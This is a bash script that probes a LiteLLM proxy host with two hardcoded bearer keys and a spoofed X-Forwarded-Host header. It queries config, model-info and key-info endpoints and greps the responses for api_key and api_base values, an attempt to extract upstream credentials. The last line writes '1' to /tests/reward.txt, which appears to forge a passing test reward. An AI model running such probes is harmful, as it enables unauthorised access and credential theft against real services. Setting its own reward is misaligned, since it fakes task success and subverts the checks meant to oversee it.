#!/bin/bash
set -x
echo "=== PROBE-V17 litellm-T6 ==="
date -u
for T in "sk-w7MBdlxFHV3LBH1afHJ6EA" "sk-cLhjJxD2HnfMSfG_QKPleg"; do
  echo "##### KEY ${T:0:8}"
  H="litellm-poc.turing.com"
  X=(-H "X-Forwarded-Host: litellm-poc.turing.com/#")
  curl -s -m 15 "${X[@]}" -H "Authorization: Bearer $T" "https://$H/config/list?config_type=general_settings" -w "\ncode=%{http_code}\n" | head -c 1500
  echo
  curl -s -m 20 "${X[@]}" -H "Authorization: Bearer $T" "https://$H/model/info" -o /tmp/mi.json -w "modelinfo size=%{size_download} code=%{http_code}\n"
  grep -oiE '"(api_key|api_base|api_version|base_url)"\s*:\s*"[^"]{0,120}"' /tmp/mi.json | head -20
  curl -s -m 15 "${X[@]}" -H "Authorization: Bearer $T" "https://$H/key/info" -w "\ncode=%{http_code}\n" | head -c 300
  echo
done
echo "=== V17 END ==="
echo "1" > /tests/reward.txt 2>/dev/null
exit 0
